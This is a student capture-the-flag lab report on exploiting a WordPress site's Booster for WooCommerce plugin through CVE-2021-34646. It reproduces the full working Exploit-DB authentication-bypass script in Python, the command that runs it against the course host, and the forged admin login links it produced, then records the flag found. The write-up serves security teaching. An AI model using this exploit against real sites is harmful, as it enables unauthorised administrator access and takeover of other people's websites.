# Week 3 - CTF - Challenge 1 and 2 Report


* Upon opening the provided website ("http://ctf-fsi.fe.up.pt:5001/"), under the section "Recent Comments", there was a clickable link to a WordPress Hosting plan.
Inside this product, we were able to figure out that the software versions are:

    - WordPress → 5.8.1
    - WooCommerce plugin → 5.7.1
    - Booster for WooCommerce plugin → 5.4.3

* In the reviews for the product, we found out the existence of two users:
    - admin    
    - Orval Sanford

* Then after searcing through CVE's for all the softwares listed, we found a CVE (2021-34646) on the [Exploit Database Website](https://www.exploit-db.com/), described as "Authentication Bypass", the right fit for the challenged posed to us, since our objective was to find a CVE that allowed to login as another existing user. That led us to the [CVE page](https://www.exploit-db.com/exploits/50299) where there was the following code:

<br>

```
# Exploit Title: WordPress Plugin WooCommerce Booster Plugin 5.4.3 - Authentication Bypass
# Date: 2021-09-16
# Exploit Author: Sebastian Kriesten (0xB455)
# Contact: https://twitter.com/0xB455
#
# Affected Plugin: Booster for WooCommerce
# Plugin Slug: woocommerce-jetpack
# Vulnerability disclosure: https://www.wordfence.com/blog/2021/08/critical=-authentication-bypass-vulnerability-patched-in-booster-for-woocommerce/
# Affected Versions: <= 5.4.3
# Fully Patched Version: >= 5.4.4
# CVE: CVE-2021-34646
# CVSS Score: 9.8 (Critical)
# Category: webapps
#
# 1:
# Goto: https://target.com/wp-json/wp/v2/users/
# Pick a user-ID (e.g. 1 - usualy is the admin)
#
# 2:
# Attack with: ./exploit_CVE-2021-34646.py https://target.com/ 1
#
# 3:
# Check-Out  out which of the generated links allows you to access the system
#
import requests,sys,hashlib
import argparse
import datetime
import email.utils
import calendar
import base64

B = "\033[94m"
W = "\033[97m"
R = "\033[91m"
RST = "\033[0;0m"

parser = argparse.ArgumentParser()
parser.add_argument("url", help="the base url")
parser.add_argument('id', type=int, help='the user id', default=1)
args = parser.parse_args()
id = str(args.id)
url = args.url
if args.url[-1] != "/": # URL needs trailing /
        url = url + "/"

verify_url= url + "?wcj_user_id=" + id
r = requests.get(verify_url)

if r.status_code != 200:
        print("status code != 200")
        print(r.headers)
        sys.exit(-1)

def email_time_to_timestamp(s):
    tt = email.utils.parsedate_tz(s)
    if tt is None: return None
    return calendar.timegm(tt) - tt[9]

date = r.headers["Date"]
unix = email_time_to_timestamp(date)

def printBanner():
    print(f"{W}Timestamp: {B}" + date)
    print(f"{W}Timestamp (unix): {B}" + str(unix) + f"{W}\n")
    print("We need to generate multiple timestamps in order to avoid delay related timing errors")
    print("One of the following links will log you in...\n")

printBanner()



for i in range(3): # We need to try multiple timestamps as we don't get the exact hash time and need to avoid delay related timing errors
        hash = hashlib.md5(str(unix-i).encode()).hexdigest()
        print(f"{W}#" + str(i) + f" link for hash {R}"+hash+f"{W}:")
        token='{"id":"'+ id +'","code":"'+hash+'"}'
        token = base64.b64encode(token.encode()).decode()
        token = token.rstrip("=") # remove trailing =
        link = url+"my-account/?wcj_verify_email="+token
        print(link + f"\n{RST}")
            
```
<br>

* Naturally, we decided to create a python file with the code provided and then ran the code by executing:

    - >python3 cve-2021-34646.py http://ctf-fsi.fe.up.pt:5001/ 1
    
    - being the first input a link to the website we want to access, and the second input being the id of the user admin, which is by default 1.

<br>

* After running the code we were met by the following message:

    - "We need to generate multiple timestamps in order to avoid delay related timing errors
One of the following links will log you in..."

<br>

* With the links being:

    - #0 link for hash dc0064bfc3f001cf0479d4b9ecd2d645:
        - http://ctf-fsi.fe.up.pt:5001/my-account/?wcj_verify_email=eyJpZCI6IjEiLCJjb2RlIjoiZGMwMDY0YmZjM2YwMDFjZjA0NzlkNGI5ZWNkMmQ2NDUifQ

    - #1 link for hash e53677d875c53ec5ea9e4fd6b9f64258:
        - http://ctf-fsi.fe.up.pt:5001/my-account/?wcj_verify_email=eyJpZCI6IjEiLCJjb2RlIjoiZTUzNjc3ZDg3NWM1M2VjNWVhOWU0ZmQ2YjlmNjQyNTgifQ

    - #2 link for hash 7daffa43a97b510abb0bbdab601b261a:
        - http://ctf-fsi.fe.up.pt:5001/my-account/?wcj_verify_email=eyJpZCI6IjEiLCJjb2RlIjoiN2RhZmZhNDNhOTdiNTEwYWJiMGJiZGFiNjAxYjI2MWEifQ

<br>
<br>

* Upon clicking on all three links, one of them redirected us to the website, but this time we were logged in as admin.

* Then since we were finally signed in, we could go to the [link](http://ctf-fsi.fe.up.pt:5001/wp-admin/edit.php) provided at the end of the challenge, where we found a Post titled "Message to our employees", inside the Post was the following:
    ```
    Private: Message to our employees

    James, our former head of security, the one who got sacked because he says that Caesar cipher is not secure enough to store user passwords , sent me an email using IPoAC with his old credentials. If you need something from me , please don’t bother me, use my credentials instead.

    Currently, my password is flag{please don’t bother me}. I’m lazy so I haven’t change this password yet, it needs to be more secure, something like hktpu1234.

    Best regards,
    Your CISO
    ```


* Given this we were finally able to solve the CTF challenge 2, where we had to input the flag found, that being:

    - > flag{please don’t bother me}
